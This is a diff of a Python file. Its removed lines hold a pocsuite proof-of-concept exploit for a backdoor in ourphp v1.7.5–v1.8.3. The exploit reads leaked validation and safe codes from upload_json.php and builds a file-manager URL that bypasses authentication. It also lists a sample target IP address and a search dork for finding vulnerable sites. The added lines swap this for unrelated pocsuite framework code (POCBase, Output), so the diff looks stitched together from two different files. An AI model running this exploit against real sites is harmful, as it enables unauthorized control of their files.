@@ -1,84 +1,194 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
-import urlparse
+"""
+Copyright (c) 2014-2016 pocsuite developers (https://seebug.org)
+See the file 'docs/COPYING' for copying permission
+"""
 
-from pocsuite.api.poc import POCBase, register, Output
-from pocsuite.api.request import req
+import types
+import logging
+import pocsuite.thirdparty.requests.exceptions as excpt
+from pocsuite.thirdparty.requests.exceptions import HTTPError
+from pocsuite.thirdparty.requests.exceptions import BaseHTTPError
+from pocsuite.thirdparty.requests.exceptions import ConnectTimeout
+from pocsuite.thirdparty.requests.exceptions import ConnectionError
+from pocsuite.thirdparty.requests.exceptions import ChunkedEncodingError
+from pocsuite.thirdparty.requests.exceptions import ContentDecodingError
+from pocsuite.thirdparty.requests.exceptions import InvalidSchema
+from pocsuite.thirdparty.requests.exceptions import InvalidURL
+from pocsuite.thirdparty.requests.exceptions import ProxyError
+from pocsuite.thirdparty.requests.exceptions import ReadTimeout
+from pocsuite.thirdparty.requests.exceptions import TooManyRedirects
+from pocsuite.lib.core.data import logger
+from pocsuite.lib.core.enums import ERROR_TYPE_ID
+from pocsuite.lib.core.enums import CUSTOM_LOGGING
+from pocsuite.lib.core.enums import OUTPUT_STATUS
+from pocsuite.lib.core.common import parseTargetUrl
+from pocsuite.lib.core.data import kb
+from pocsuite.lib.core.data import conf
+from pocsuite.api.utils import strToDict
 
 
-class TestPOC(POCBase):
-    vulID = ''
-    version = '1'
-    author = 'elloit'
-    vulDate = ''
-    createDate = ''
-    updateDate = ''
-    references = ['https://xz.aliyun.com/t/4315']
-    name = 'ourphp 后门漏洞'
-    appPowerLink = 'http://www.ourphp.net'
-    appName = 'ourphp'
-    appVersion = 'v1.7.5-v1.8.3'
-    vulType = '后门'
-    desc = '''
-    在function\editor\php\upload_json.php 中会暴露出生成的校验码，导致口令码和校验码泄露。
-    在http://localhost:88/client/manage/ourphp_filebox.php?op=home&folder=./&validation=12345&code=QZRdvlYHlDUgqZubIGV9Mx46JCqmDNkmYHlDUg
-    处，将泄露的口令码和 校验码 + 校验码第七位到第十二位之间的部分， 即可通过验证，对网站文件进行管理。
-    '''
-    samples = [
-        "https://123.207.235.207"
-    ]
-    install_requires = ""
-    search_keyword = '"Powered by ourphp"'
+class POCBase(object):
 
-    def _verify(self):
-        result = {}
-        # 格式化URL
-        url = urlparse.urlparse(self.url)
-        vul_url = url.scheme + "://" + url.netloc + "/function/editor/php/upload_json.php?upload_file=hola"
+    def __init__(self):
+        self.type = None
+        self.target = None
+        self.url = None
+        self.mode = None
+        self.params = None
+        self.verbose = None
+
+    def execute(self, target, headers=None, params=None, mode='verify', verbose=True):
+        """
+        :param url: the target url
+        :param headers: a :class dict include some fields for request header.
+        :param params: a instance of Params, includ extra params
+
+        :return: A instance of Output
+        """
+        self.target = target
+        self.url = parseTargetUrl(target)
+        self.headers = headers
+        self.params = strToDict(params) if params else {}
+        self.mode = mode
+        self.verbose = verbose
+        self.expt = (0, 'None')
+        # TODO
+        output = None
+
         try:
-            res = req.get(url=vul_url, timeout=(10, 15), verify=False)
-            if res.status_code == 200:
-                text = res.text.replace("<!--", "")
-                text = text.replace("-->", "")
-                validation = text.split("||")[0]
-                safecode = text.split("||")[1]
-                vul_url_check = url.scheme + "://" + url.netloc + \
-                                "/client/manage/ourphp_filebox.php?op=home&folder=./&validation="+ validation +\
-                                "&code=" + safecode + safecode[6:12]
-                res_check = req.get(url=vul_url_check, timeout=(10, 15), verify=False)
-                if res_check.status_code == 200 and "重命名" in res_check.content:
-                    result["VerifyInfo"] = {}
-                    result["VerifyInfo"]["URL"] = self.url
-                    result["extra"] = {}
-                    result["extra"]["validation"] = validation
-                    result["extra"]["safecode"] = safecode
-                    result["extra"]["info"] = self.get_info()
-        except Exception as e:
-            return self.parse_output(result)
+            if self.mode == 'attack':
+                output = self._attack()
+            else:
+                output = self._verify()
 
-        return self.parse_output(result)
+        except NotImplementedError, e:
+            self.expt = (ERROR_TYPE_ID.NOTIMPLEMENTEDERROR, e)
+            logger.log(CUSTOM_LOGGING.ERROR, 'POC: %s not defined ' '%s mode' % (self.name, self.mode))
+            output = Output(self)
 
-    def _attack(self):
-        self._verify()
+        except ConnectTimeout, e:
+            self.expt = (ERROR_TYPE_ID.CONNECTTIMEOUT, e)
+            while conf.retry > 0:
+                logger.log(CUSTOM_LOGGING.WARNING, 'POC: %s timeout, start it over.' % self.name)
+                try:
+                    if self.mode == 'attack':
+                        output = self._attack()
+                    else:
+                        output = self._verify()
+                    break
+                except ConnectTimeout:
+                    logger.log(CUSTOM_LOGGING.ERROR, 'POC: %s time-out retry failed!' % self.name)
+                    output = Output(self)
+                conf.retry -= 1
+            else:
+                logger.log(CUSTOM_LOGGING.ERROR, str(e))
+                output = Output(self)
 
-    def get_info(self):
-        try:
-            page = req.get(self.url, timeout=(10, 15), verify=False).text
-            title_left_index = page.find("<title>")
-            title_right_index = page.find("</title>")
-            title = page[title_left_index+7:title_right_index].strip()
-        except:
-            return ""
-        return title
+        except HTTPError, e:
+            self.expt = (ERROR_TYPE_ID.HTTPERROR, e)
+            logger.log(CUSTOM_LOGGING.WARNING, 'POC: %s HTTPError occurs, start it over.' % self.name)
+            output = Output(self)
 
-    def parse_output(self, result):
-        output = Output(self)
-        if result:
-            output.success(result)
-        else:
-            output.fail('Internet nothing returned')
+        except ConnectionError, e:
+            self.expt = (ERROR_TYPE_ID.CONNECTIONERROR, e)
+            logger.log(CUSTOM_LOGGING.ERROR, str(e))
+            output = Output(self)
+
+        except TooManyRedirects, e:
+            self.expt = (ERROR_TYPE_ID.TOOMANYREDIRECTS, e)
+            logger.log(CUSTOM_LOGGING.ERROR, str(e))
+            output = Output(self)
+
+        except Exception, e:
+            self.expt = (ERROR_TYPE_ID.OTHER, e)
+            logger.log(CUSTOM_LOGGING.ERROR, str(e))
+            output = Output(self)
+
         return output
 
+    def _attack(self):
+        '''
+        @function   以Poc的attack模式对urls进行检测(可能具有危险性)
+                    需要在用户自定义的Poc中进行重写
+                    返回一个Output类实例
+        '''
+        raise NotImplementedError
 
-register(TestPOC)
+    def _verify(self):
+        '''
+        @function   以Poc的verify模式对urls进行检测(可能具有危险性)
+                    需要在用户自定义的Poc中进行重写
+                    返回一个Output类实例
+        '''
+        raise NotImplementedError
+
+    """
+    def _kwargsPatch(self, func):
+        def wrapper(*args, **kwargs):
+
+            try:
+                userHeaders = kwargs['headers']
+            except:
+                userHeaders = {}
+
+            kwargs.update({'headers': self.headers})
+            kwargs['headers'].update(userHeaders)
+            return func(*args, **kwargs)
+        return wrapper
+
+    req.get = _kwargsPatch(req.get)
+    """
+
+
+class Output(object):
+
+    ''' output of pocs
+    Usage::
+        >>> poc = POCBase()
+        >>> output = Output(poc)
+        >>> result = {'FileInfo': ''}
+        >>> output.success(result)
+        >>> output.fail('Some reason failed or errors')
+    '''
+
+    def __init__(self, poc=None):
+        self.error = tuple()
+        self.result = {}
+        self.status = OUTPUT_STATUS.FAILED
+        if poc:
+            self.url = poc.url
+            self.mode = poc.mode
+            self.vulID = poc.vulID
+            self.name = poc.name
+            self.appName = poc.appName
+            self.appVersion = poc.appVersion
+            self.error = poc.expt
+
+    def is_success(self):
+        return bool(True and self.status)
+
+    def success(self, result):
+        assert isinstance(result, types.DictType)
+        self.status = OUTPUT_STATUS.SUCCESS
+        self.result = result
+
+    def fail(self, error=""):
+        self.status = OUTPUT_STATUS.FAILED
+        assert isinstance(error, types.StringType)
+        self.error = (0, error)
+
+    def error(self, error=""):
+        self.expt = (ERROR_TYPE_ID.OTHER, error)
+        self.error = (0, error)
+
+    def show_result(self):
+        if self.status == OUTPUT_STATUS.SUCCESS:
+            for k, v in self.result.items():
+                if isinstance(v, dict):
+                    for kk, vv in v.items():
+                        logger.log(CUSTOM_LOGGING.SUCCESS, "%s : %s" % (kk, vv))
+                else:
+                    logger.log(CUSTOM_LOGGING.SUCCESS, "%s : %s" % (k, v))
